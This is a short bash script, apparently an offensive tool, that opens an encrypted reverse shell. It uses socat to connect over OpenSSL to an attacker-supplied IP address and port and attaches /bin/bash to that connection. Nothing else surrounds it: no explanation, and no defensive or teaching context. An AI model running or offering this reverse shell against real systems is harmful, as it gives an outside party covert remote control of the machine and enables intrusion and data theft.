#!/bin/bash
ATTACKER_IP=$1
PORT=$2

socat OPENSSL:$ATTACKER_IP:$PORT EXEC:/bin/bash
